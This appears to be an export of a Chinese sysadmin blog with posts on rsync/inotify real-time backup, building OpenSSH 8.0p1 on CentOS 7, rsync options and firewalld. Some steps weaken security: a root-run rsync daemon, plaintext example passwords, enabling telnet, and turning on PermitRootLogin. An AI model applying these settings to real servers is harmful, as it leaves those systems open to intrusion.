href="https://mp.weixin.qq.com/s?__biz=MzI5NzY0MzM0OQ==&mid=2247483717&idx=1&sn=e0e0cad1c75062c8ab0ce40afa935a0c&chksm=ecb0bd7fdbc73469dd10aff6a75c7e45b9cf12e71afc1687ef3cf8ba3a58b43e189273b737c7&mpshare=1&scene=1&srcid=&sharer_sharetime=1563862637449&sharer_shareid=96290980786f0825d84f1a8fef954414#rd">站长那些事儿</a></p><h4 id="两台服务器一起安装-rsync"><a href="#两台服务器一起安装-rsync" class="headerlink" title="两台服务器一起安装 rsync"></a>两台服务器一起安装 rsync</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install rsync xinetd -y</span><br></pre></td></tr></table></figure><p>还要增加一个配置文件 (这个配置文件在CentOS7下不存在，我们手动创建)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/xinetd.d/rsync</span><br></pre></td></tr></table></figure><p>内容如下</p><pre><code># default: off# description: The rsync server is a good addition to an ftp server, as it \#       allows crc checksumming etc.service rsync&#123;        disable = no        flags           = IPv6        socket_type     = stream        wait            = no        user            = root        server          = /usr/bin/rsync        server_args     = --daemon        log_on_failure  += USERID&#125;</code></pre><p>是 <a href="https://blog.csdn.net/bwlab/article/details/50556159">从这里</a> 找滴，亲测可用</p><h4 id="接下来是-负责备份的服务器-的事情了"><a href="#接下来是-负责备份的服务器-的事情了" class="headerlink" title="接下来是 负责备份的服务器 的事情了"></a>接下来是 负责备份的服务器 的事情了</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/rsyncd.conf</span><br></pre></td></tr></table></figure><p>添加以下内容</p><pre><code>log file = /var/log/rsyncd.logpidfile = /var/run/rsyncd.pidlock file = /var/run/rsync.locksecrets file = /etc/rsync.passmotd file = /etc/rsyncd.Motd#模块名称[test]#你想备份在本服务器哪个路径就填呗path = /home/test#描述随便加comment = just a testuid = 0gid = 0port = 873use chroot = noread only = nolist = nomax connections = 200timeout = 600#认证用户名，可以随便取auth users = test_user#主服务器IP地址hosts allow = 你的ip地址</code></pre><p>认证用户和密码文件，系统原本没有，需要我们手动创建的喔。<br>该文件名字可以随意</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/rsync.pass</span><br></pre></td></tr></table></figure><p>里面是内容是 键值对</p><pre><code>test_user:testpass</code></pre><p>这里注意啦，必须是权限必须是 600 喔</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /etc/rsyncd.conf &amp;&amp;</span><br><span class="line">chmod 600 /etc/rsync.pass &amp;&amp;</span><br><span class="line">service xinetd restart</span><br></pre></td></tr></table></figure><p>启动 rsync 有些需要有些不需要， 可能是防火墙原因阻拦了其他端口…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync --daemon --config&#x3D;&#x2F;etc&#x2F;rsyncd.conf --port&#x3D;873</span><br></pre></td></tr></table></figure><h4 id="接下来到-主服务器-的事情了"><a href="#接下来到-主服务器-的事情了" class="headerlink" title="接下来到 主服务器 的事情了"></a>接下来到 主服务器 的事情了</h4><p>首先创建密码文件，文件名字也是可以随意喔！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/passwd.rsync</span><br></pre></td></tr></table></figure><p>内容注意啦</p><pre><code>testpass</code></pre><p>是 刚刚备份服务器 /etc/rsync.pass 目录下认证用户的密码喔，只需填上面红字的内容就OK啦</p><p>这里权限也要注意，必须是 600 喔</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /etc/passwd.rsync &amp;&amp;</span><br><span class="line">service xinetd restart</span><br></pre></td></tr></table></figure><p>先安装预编译所需要的工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install make gcc gcc-c++ -y</span><br></pre></td></tr></table></figure><p>然后下载和安装inotify-tools</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/src &amp;&amp;</span><br><span class="line">wget https://download.laobuluo.com/tools/inotify-tools-3.14.tar.gz &amp;&amp;</span><br><span class="line">tar -zxvf inotify-tools-3.14.tar.gz &amp;&amp;</span><br><span class="line"><span class="built_in">cd</span> inotify-tools-3.14 &amp;&amp;</span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/inotify &amp;&amp;</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PATH=/usr/local/inotify/bin:<span class="variable">$PATH</span>&quot;</span> &gt;&gt;/etc/profile.d/inotify.sh &amp;&amp;</span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/inotify.sh &amp;&amp;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/usr/local/inotify/lib&quot;</span> &gt;/etc/ld.so.conf.d/inotify.conf &amp;&amp;</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/inotify/include /usr/include/inotify</span><br></pre></td></tr></table></figure><p>配置参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>注释后面添加</p><pre><code>fs.inotify.max_queued_events=99999999fs.inotify.max_user_watches=99999999fs.inotify.max_user_instances=65535</code></pre><p>创建排除目录列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/inotify/exclude.list</span><br></pre></td></tr></table></figure><p>创建一个排除目录，这里可以添加不同步的目录，一行一个目录。如果暂时没有可以留空，以后需要用到在添加。</p><p>如果 uploads 目录是挂载目录可以排除掉</p><pre><code>    wp-content/uploads/</code></pre><p>增量备份脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/inotify/rsync.sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#主服务器需要备份的目录</span></span><br><span class="line">srcdir=/home/<span class="built_in">test</span></span><br><span class="line"><span class="comment">#模块名称</span></span><br><span class="line">dstdir=<span class="built_in">test</span></span><br><span class="line">excludedir=/usr/<span class="built_in">local</span>/inotify/exclude.list</span><br><span class="line"><span class="comment">#认证名称</span></span><br><span class="line">rsyncuser=test_user</span><br><span class="line"><span class="comment">#本机存密码的目录</span></span><br><span class="line">rsyncpassdir=/etc/passwd.rsync</span><br><span class="line"><span class="comment">#备份服务器的IP地址</span></span><br><span class="line">dstip=<span class="string">&quot;备份服务器滴IP地址&quot;</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="variable">$dstip</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">rsync -avH --port=873 --progress --delete --exclude-from=<span class="variable">$excludedir</span> <span class="variable">$srcdir</span> <span class="variable">$rsyncuser</span>@<span class="variable">$ip</span>::<span class="variable">$dstdir</span> --password-file=<span class="variable">$rsyncpassdir</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">/usr/<span class="built_in">local</span>/inotify/bin/inotifywait -mrq --timefmt <span class="string">&#x27;%d/%m/%y %H:%M&#x27;</span> --format <span class="string">&#x27;%T %w%f%e&#x27;</span> -e close_write,modify,delete,create,attrib,move <span class="variable">$srcdir</span> | <span class="keyword">while</span> <span class="built_in">read</span> file</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="variable">$dstip</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">rsync -avH --port=873 --progress --delete --exclude-from=<span class="variable">$excludedir</span> <span class="variable">$srcdir</span> <span class="variable">$rsyncuser</span>@<span class="variable">$ip</span>::<span class="variable">$dstdir</span> --password-file=<span class="variable">$rsyncpassdir</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; <span class="variable">$&#123;file&#125;</span> was rsynced&quot;</span> &gt;&gt; /tmp/rsync.log 2&gt;&amp;1</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>脚本可执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/<span class="built_in">local</span>/inotify/rsync.sh</span><br></pre></td></tr></table></figure><p>添加开机启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure><p>开机启动文件中最后一行添加</p><pre><code>sh /usr/local/inotify/rsync.sh &amp;</code></pre><h3 id="通过互换-ip-迁移服务器"><a href="#通过互换-ip-迁移服务器" class="headerlink" title="通过互换 ip 迁移服务器"></a>通过互换 ip 迁移服务器</h3><p>Centos重启网络配置文件会导致 /etc/resolv.conf 被覆盖或清空 进而导致 yum 无法使用</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> ansible </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> ansible </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Install_OpenSSH8.0p1_from_source</title>
      <link href="2019/07/14/Install-OpenSSH8-0p1-from-source/"/>
      <url>2019/07/14/Install-OpenSSH8-0p1-from-source/</url>
      
        <content type="html"><![CDATA[<h3 id="系统环境-CentOS-7-x86-64-Minimal-1511"><a href="#系统环境-CentOS-7-x86-64-Minimal-1511" class="headerlink" title="系统环境: CentOS-7-x86_64-Minimal-1511"></a>系统环境: CentOS-7-x86_64-Minimal-1511</h3><h3 id="root用户-备份-下载包-校验包-一气呵成"><a href="#root用户-备份-下载包-校验包-一气呵成" class="headerlink" title="root用户+备份+下载包+校验包 一气呵成"></a>root用户+备份+下载包+校验包 一气呵成</h3><h4 id="Package-Information-包的相关信息"><a href="#Package-Information-包的相关信息" class="headerlink" title="Package Information (包的相关信息)"></a>Package Information (包的相关信息)</h4><ul><li><p>Download (HTTP): <a href="https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-8.0p1.tar.gz">https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-8.0p1.tar.gz</a></p></li><li><p>Download MD5 sum: bf050f002fe510e1daecd39044e1122d</p></li><li><p>Download size: 1.5 MB</p></li><li><p>Estimated disk space required: 45 MB (add 12 MB for tests)</p></li><li><p>Estimated build time: 0.4 SBU (running the tests takes 17+ minutes, irrespective of processor speed)</p></li></ul><h3 id="虽然没出过事-但还是要留条退路"><a href="#虽然没出过事-但还是要留条退路" class="headerlink" title="虽然没出过事, 但还是要留条退路"></a>虽然没出过事, 但还是要留条退路</h3><p>安装 telnet</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install telnet-server.x86_64 &amp;&amp;</span><br><span class="line">yum -y install telnet.x86_64</span><br></pre></td></tr></table></figure><p>安装 xinetd (提供访问和日志管理等功能)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install xinetd.x86_64</span><br></pre></td></tr></table></figure><p>开启服务 &amp;&amp; 开机启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl start xinetd &amp;&amp;</span><br><span class="line">systemctl start telnet.socket &amp;&amp;</span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> telnet.socket &amp;&amp;</span><br><span class="line">systemctl <span class="built_in">enable</span> xinetd.service </span><br></pre></td></tr></table></figure><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>如果直接上可能出现以下 4 个问题:</p><h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><pre><code>checking for cc... nochecking for gcc... noconfigure: error: in \`/root/openssh-8.0p1&#39;:configure: error: no acceptable C compiler found in $PATHSee \`config.log&#39; for more details</code></pre><p>缺少 cc 和 gcc 编译器, 解决方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install cc gcc</span><br></pre></td></tr></table></figure><h4 id="二"><a href="#二" class="headerlink" title="二"></a>二</h4><pre><code>checking for zlib.h... noconfigure: error: *** zlib.h missing - please install first or check config.log ***</code></pre><p>缺少 zlib-devel 环境, 解决方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install zlib-devel</span><br></pre></td></tr></table></figure><h4 id="三"><a href="#三" class="headerlink" title="三"></a>三</h4><pre><code>configure: error: *** working libcrypto not found, check config.log</code></pre><p>libcrypto 有点眼熟…<br>解决方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install openssl-devel</span><br></pre></td></tr></table></figure><h4 id="四"><a href="#四" class="headerlink" title="四"></a>四</h4><pre><code>configure: error: PAM headers not found</code></pre><p>缺少pam-devel环境, 解决方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install pam-devel</span><br></pre></td></tr></table></figure><p>设置适当的环境以用于其他安装步骤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">install  -v -m700 -d /var/lib/sshd &amp;&amp;</span><br><span class="line">chown    -v root:sys /var/lib/sshd &amp;&amp;</span><br><span class="line"></span><br><span class="line">groupadd -g 50 sshd        &amp;&amp;</span><br><span class="line">useradd  -c <span class="string">&#x27;sshd PrivSep&#x27;</span> \</span><br><span class="line">         -d /var/lib/sshd  \</span><br><span class="line">         -g sshd           \</span><br><span class="line">         -s /bin/<span class="literal">false</span>     \</span><br><span class="line">         -u 50 sshd</span><br></pre></td></tr></table></figure><p>安装官网的编译应该木得问题了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr                     \</span><br><span class="line">            --sysconfdir=/etc/ssh             \</span><br><span class="line">            --with-md5-passwords              \</span><br><span class="line">            --with-pam  \</span><br><span class="line">            --with-privsep-path=/var/lib/sshd</span><br></pre></td></tr></table></figure><h3 id="编译并测试下"><a href="#编译并测试下" class="headerlink" title="编译并测试下"></a>编译并测试下</h3><p>make &amp;&amp; make test</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">make install &amp;&amp;</span><br><span class="line">install -v -m755    contrib/ssh-copy-id /usr/bin     &amp;&amp;</span><br><span class="line"></span><br><span class="line">install -v -m644    contrib/ssh-copy-id.1 \</span><br><span class="line">                    /usr/share/man/man1              &amp;&amp;</span><br><span class="line">install -v -m755 -d /usr/share/doc/openssh-8.0p1     &amp;&amp;</span><br><span class="line">install -v -m644    INSTALL LICENCE OVERVIEW README* \</span><br><span class="line">                    /usr/share/doc/openssh-8.0p1</span><br></pre></td></tr></table></figure><h4 id="遇到的两个错误信息"><a href="#遇到的两个错误信息" class="headerlink" title="遇到的两个错误信息"></a>遇到的两个错误信息</h4><h4 id="一-1"><a href="#一-1" class="headerlink" title="一"></a>一</h4><pre><code>/etc/ssh/sshd_config line 79: Unsupported option GSSAPIAuthentication/etc/ssh/sshd_config line 80: Unsupported option GSSAPICleanupCredentials</code></pre><p>注释掉这两行就好啦, 解决方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;/^GSSAPICleanupCredentials/s/GSSAPICleanupCredentials yes/#GSSAPICleanupCredentials yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;/^GSSAPIAuthentication/s/GSSAPIAuthentication yes/#GSSAPIAuthentication yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;/^GSSAPIAuthentication/s/GSSAPIAuthentication no/#GSSAPIAuthentication no/&#x27;</span> /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><h4 id="二-1"><a href="#二-1" class="headerlink" title="二"></a>二</h4><pre><code>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0640 for &#39;/etc/ssh/ssh_host_rsa_key&#39; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Unable to load host key &quot;/etc/ssh/ssh_host_rsa_key&quot;: bad permissionsUnable to load host key: /etc/ssh/ssh_host_rsa_key@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0640 for &#39;/etc/ssh/ssh_host_ecdsa_key&#39; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Unable to load host key &quot;/etc/ssh/ssh_host_ecdsa_key&quot;: bad permissionsUnable to load host key: /etc/ssh/ssh_host_ecdsa_key@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0640 for &#39;/etc/ssh/ssh_host_ed25519_key&#39; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Unable to load host key &quot;/etc/ssh/ssh_host_ed25519_key&quot;: bad permissionsUnable to load host key: /etc/ssh/ssh_host_ed25519_keysshd: no hostkeys available -- exiting.make: [check-config] Error 1 (ignored)</code></pre><p>上面三个文件的权限问题, 解决方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /etc/ssh/ssh_host_rsa_key &amp;&amp;</span><br><span class="line">chmod 600 /etc/ssh/ssh_host_ecdsa_key &amp;&amp;</span><br><span class="line">chmod 600 /etc/ssh/ssh_host_ed25519_key</span><br></pre></td></tr></table></figure><h4 id="修改配置文件-允许root登录"><a href="#修改配置文件-允许root登录" class="headerlink" title="修改配置文件,允许root登录"></a>修改配置文件,允许root登录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;/^#PermitRootLogin/s/#PermitRootLogin no/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;</span><br><span class="line">sed -i <span class="string">&#x27;/^#PermitRootLogin/s/#PermitRootLogin yes/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><h3 id="sshd-开机启动"><a href="#sshd-开机启动" class="headerlink" title="sshd 开机启动"></a>sshd 开机启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> sshd</span><br></pre></td></tr></table></figure><p>还有别忘了关闭 telnet 喔!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop xinetd &amp;&amp;</span><br><span class="line">systemctl stop telnet.socket &amp;&amp;</span><br></pre></td></tr></table></figure><p>———————————————————— END ————————————————————</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7_backup</title>
      <link href="2019/07/13/CentOS7-backup/"/>
      <url>2019/07/13/CentOS7-backup/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.51cto.com/13272050/2094687">参考链接: 左客 rsync增量备份</a></p><h3 id="tar-备份失败"><a href="#tar-备份失败" class="headerlink" title="tar 备份失败"></a>tar 备份失败</h3><p>一个小坑:<br>我在执行下面命令的时候, 如果我不是在根目录, 会导致备份失败, 不是很懂为什么.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time tar cvpjf <span class="variable">$&#123;BZ2BACKUP&#125;</span> --exclude=/proc --exclude=/lost+found --exclude=/<span class="variable">$&#123;BZ2BACKUP&#125;</span> --exclude=/mnt --exclude=/sys --exclude=/media /</span><br></pre></td></tr></table></figure><h3 id="rsync-三种工作方式"><a href="#rsync-三种工作方式" class="headerlink" title="rsync 三种工作方式"></a>rsync 三种工作方式</h3><ul><li><p>本地文件系统上实现同步。命令行语法格式为上述”Local”段的格式。</p></li><li><p>本地主机使用远程shell和远程主机通信。命令行语法格式为上述”Access via remote shell”段的格式。</p></li><li><p>本地主机通过网络套接字连接远程主机上的rsync daemon。命令行语法格式为上述”Access via rsync daemon”段的格式。</p></li></ul><pre style = "margin: 0 -120px; font-size: 14px; width: 970px; line-height: 26px;">    <font color = #00B000>相关参数说明:-v：显示rsync过程中详细信息。可以使用"-vvvv"获取更详细信息。-P：显示文件传输的进度信息。(实际上"-P"="--partial --progress"，其中的"--progress"才是显示进度信息的)。-n --dry-run  ：仅测试传输，而不实际传输。常和"-vvvv"配合使用来查看rsync是如何工作的。-a --archive  ：归档模式，表示递归传输并保持文件属性。等同于"-rtopgDl"。-r --recursive：递归到目录中去。-t --times：保持mtime属性。强烈建议任何时候都加上"-t"，否则目标文件mtime会设置为系统时间，导致下次更新          ：检查出mtime不同从而导致增量传输无效。-o --owner：保持owner属性(属主)。-g --group：保持group属性(属组)。-p --perms：保持perms属性(权限，不包括特殊权限)。-D        ：是"--device --specials"选项的组合，即也拷贝设备文件和特殊文件。-l --links：如果文件是软链接文件，则拷贝软链接本身而非软链接所指向的对象。-z        ：传输时进行压缩提高效率。-R --relative：使用相对路径。意味着将命令行中指定的全路径而非路径最尾部的文件名发送给服务端，包括它们的属性。用法见下文示例。--size-only ：默认算法是检查文件大小和mtime不同的文件，使用此选项将只检查文件大小。-u --update ：仅在源mtime比目标已存在文件的mtime新时才拷贝。注意，该选项是接收端判断的，不会影响删除行为。-d --dirs   ：以不递归的方式拷贝目录本身。默认递归时，如果源为"dir1/file1"，则不会拷贝dir1目录，使用该选项将拷贝dir1但不拷贝file1。--max-size  ：限制rsync传输的最大文件大小。可以使用单位后缀，还可以是一个小数值(例如："--max-size=1.5m")--min-size  ：限制rsync传输的最小文件大小。这可以用于禁止传输小文件或那些垃圾文件。--exclude   ：指定排除规则来排除不需要传输的文件。--delete    ：以SRC为主，对DEST进行同步。多则删之，少则补之。注意"--delete"是在接收端执行的，所以它是在            ：exclude/include规则生效之后才执行的。-b --backup ：对目标上已存在的文件做一个备份，备份的文件名后默认使用"~"做后缀。--backup-dir：指定备份文件的保存路径。不指定时默认和待备份文件保存在同一目录下。-e          ：指定所要使用的远程shell程序，默认为ssh。--port      ：连接daemon时使用的端口号，默认为873端口。--password-file：daemon模式时的密码文件，可以从中读取密码实现非交互式。注意，这不是远程shell认证的密码，而是rsync模块认证的密码。-W --whole-file：rsync将不再使用增量传输，而是全量传输。在网络带宽高于磁盘带宽时，该选项比增量传输更高效。--existing  ：要求只更新目标端已存在的文件，目标端还不存在的文件不传输。注意，使用相对路径时如果上层目录不存在也不会传输。--ignore-existing：要求只更新目标端不存在的文件。和"--existing"结合使用有特殊功能，见下文示例。--remove-source-files：要求删除源端已经成功传输的文件。    </font></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7</title>
      <link href="2019/07/09/CentOS7/"/>
      <url>2019/07/09/CentOS7/</url>
      
        <content type="html"><![CDATA[<h4 id="我使用滴-CentOS-7-版本-CentOS-Linux-release-7-2-1511-Core"><a href="#我使用滴-CentOS-7-版本-CentOS-Linux-release-7-2-1511-Core" class="headerlink" title="我使用滴 CentOS 7 版本: CentOS Linux release 7.2.1511 (Core)"></a>我使用滴 CentOS 7 版本: CentOS Linux release 7.2.1511 (Core)</h4><h3 id="CentOS-6-和-CentOS-7-在华为平台上的两个主要区别"><a href="#CentOS-6-和-CentOS-7-在华为平台上的两个主要区别" class="headerlink" title="CentOS 6 和 CentOS 7 在华为平台上的两个主要区别"></a>CentOS 6 和 CentOS 7 在华为平台上的两个主要区别</h3><ul><li><p>CentOS6：</p><ul><li>支持快照；</li><li>采用sysvinit，服务启动稍慢，fstab和nfs挂载容易出现问题。</li></ul></li><li><p>CentOS7：</p><ul><li>不支持快照，需要自己备份；</li><li>采用systemed，设计目标是克服sysvinit的缺点。</li></ul></li></ul><h3 id="firewalld-amp-amp-firewall-cmd"><a href="#firewalld-amp-amp-firewall-cmd" class="headerlink" title="firewalld &amp;&amp; firewall-cmd"></a>firewalld &amp;&amp; firewall-cmd</h3><p>新安装好 nginx 的我兴致勃勃的输入我的ip, 结果….<br><img src="/img/Linux_Server_Maintenance/firewall_nginx_err.png" class="lazyload" data-srcset="/img/Linux_Server_Maintenance/firewall_nginx_err.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="firewall_nginx_err"></p><p>于是我检查 服务状态, 配置文件 和 日志文件 好像在 Ubuntu 上都是一样呀..<br>然后发现了 CentOS7 的防火墙默认只开启 ssh 服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --list-services</span><br></pre></td></tr></table></figure><p>那怎么去开启一个端口呢? 这里用 80 端口举例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent  <span class="comment"># （--permanent永久生效，没有此参数重启后失效）</span></span><br><span class="line">firewall-cmd --reload <span class="comment"># 重新载入</span></span><br><span class="line">firewall-cmd --zone=public --query-port=80/tcp <span class="comment"># 查看 80 端口</span></span><br><span class="line">firewall-cmd --zone=public --remove-port=80/tcp --permanent <span class="comment"># 关闭 80 端口</span></span><br></pre></td></tr></table></figure><p>然后就可以正常访问 nginx 啦!</p><p>于是又想起许多防火墙是通过 iptables 去管理的, 顺便到 Red Hat 官方文档 gup 了一下</p><p>发现在 RHEL7 系统中, 系统默认是自带 firewall 的, 并且默认关闭开启80端口</p><p>值得一提的是 firewall 调用 iptables 的相关命令.</p><p>想要详细了解可以参考 <a 